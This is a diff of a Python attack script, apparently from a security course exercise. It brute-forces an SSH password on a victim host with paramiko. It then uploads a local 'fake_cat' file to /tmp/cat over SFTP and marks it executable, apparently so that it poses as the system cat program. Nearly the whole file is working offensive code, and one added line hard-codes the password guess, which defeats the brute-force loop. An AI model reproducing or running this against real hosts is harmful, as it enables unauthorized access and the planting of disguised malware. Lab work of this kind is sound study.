@@ -1,4 +1,4 @@
-#!/usr/bin python3
+#!/usr/bin/env python3
 
 # cat program -> /usr/bin/cat
 # size = 43416 bytes
@@ -15,18 +15,26 @@ attack_ip = None
 attack_pt = None
 correct_password = None
 
-def try_ssh_connection(hostname, port=22, username, password):
+def try_ssh_connection(hostname, username, password, port=22):
 	client = paramiko.SSHClient()
 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 	try:
 		client.connect(hostname, port, username, password, timeout=3)
+	except paramiko.AuthenticationException as authException:
+		print(f"Auth Failed on {username} {password}")
+		time.sleep(0.5)
+		return False
 	except paramiko.SSHException as sshException:
-		print(f"Unable to establish SSH connection: {sshException}")
-		time.sleep(5)
+# print(f"Unable to establish SSH connection: {sshException}")
+		time.sleep(10)
 		return try_ssh_connection(hostname, port, username, password)
-	else:
-		return None
+	except:
+		time.sleep(10)
+		return False
+
+	client.close()
+	return True
 
 
 def crack_ssh_password():
@@ -42,25 +50,37 @@ def crack_ssh_password():
 	for i in range(1, len(lin) + 1):
 		for j in itertools.permutations(lin, i):
 			now = ''.join(j)
-			client = try_ssh_connection(
+			
+			now = 'csc2022'
+
+			result = try_ssh_connection(
 				hostname = victim_ip,
 				username = 'csc2022',
 				password = now
 			)
-			if client != None:
+			if result == True:
 				correct_password = now
-				print(f"Correct Password = {now}")
-				return client
-	return None
+				print(f"Correct Password = {now}\n")
+				return True
+			time.sleep(0.5)
+	return False
 
 
 def download_virus(client):
+	global correct_password, victim_ip
+
+	print(f"Sending file to {victim_ip}")
+
+	client = paramiko.SSHClient()
+	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	client.connect(victim_ip, 22, 'csc2022', correct_password, timeout=3)
 	sftp = client.open_sftp()
 	
 	localpath = './fake_cat'
 	sftp.put(localpath, '/tmp/cat')
 	sftp.close()
-
+	
+	client.exec_command('chmod +x /tmp/cat')
 	client.close()
 	return
 
@@ -78,7 +98,7 @@ def main():
 		return
 
 	client = crack_ssh_password()
-	if client == None:
+	if client != True:
 		print('Crack Password Failed!')
 		return
 
